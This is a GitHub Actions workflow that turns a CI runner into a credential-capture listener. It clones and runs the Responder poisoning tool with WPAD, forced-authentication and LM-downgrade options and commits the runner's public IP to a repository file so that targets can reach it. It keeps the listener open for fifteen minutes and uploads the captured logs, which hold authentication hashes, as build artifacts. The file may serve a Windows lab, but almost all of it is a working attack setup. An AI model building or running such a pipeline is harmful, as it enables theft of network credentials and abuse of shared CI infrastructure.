name: responder-capture
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  responder:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - name: setup responder
        run: |
          sudo python3 -m pip install --break-system-packages -q netifaces aioquic 2>&1 | tail -1 || true
          git clone --depth 1 https://github.com/lgandx/Responder.git /tmp/Responder
          if ! python3 -c "import aioquic" 2>/dev/null; then
            sed -i 's/^QUIC.*/QUIC = Off/' /tmp/Responder/Responder.conf
            echo "aioquic missing, QUIC disabled"
          else
            echo "aioquic ok"
          fi
          python3 -c "import netifaces; print('netifaces ok')"
      - name: report and publish ip
        run: |
          PUBIP=$(curl -s https://api.ipify.org)
          echo "PUBIP=$PUBIP"
          B64=$(printf '%s' "$PUBIP" | base64 -w0)
          curl -s -X PUT -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/Sakura-501/winlab-ci/contents/ip.txt \
            -d "{\"message\":\"ip\",\"content\":\"$B64\",\"sha\":\"$SHA\"}" \
            -o /tmp/ipwrite.json || true
          SHA=$(gh api repos/Sakura-501/winlab-ci/contents/ip.txt --jq .sha 2>/dev/null || true)
          if [ -n "$SHA" ]; then
            curl -s -X PUT -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
              -H "Accept: application/vnd.github+json" \
              https://api.github.com/repos/Sakura-501/winlab-ci/contents/ip.txt \
              -d "{\"message\":\"ip\",\"content\":\"$B64\",\"sha\":\"$SHA\"}" -o /tmp/ipwrite.json
          fi
          cat /tmp/ipwrite.json | head -3 || true
          echo "published"
      - name: run responder
        run: |
          cd /tmp/Responder
          (sudo python3 Responder.py -I eth0 -v -wF --lm --disable-ess > /tmp/responder.log 2>&1 &)
          sleep 8
          echo "--- ss 445 ---"
          sudo ss -lntp | grep 445 || echo "445 NOT LISTENING"
          head -30 /tmp/responder.log || true
          echo "responder started; window=900s"
          sleep 900
          echo "window closed"
      - name: upload logs
        uses: actions/upload-artifact@v4
        with:
          name: responder-logs
          path: |
            /tmp/responder.log
            /tmp/Responder/logs/
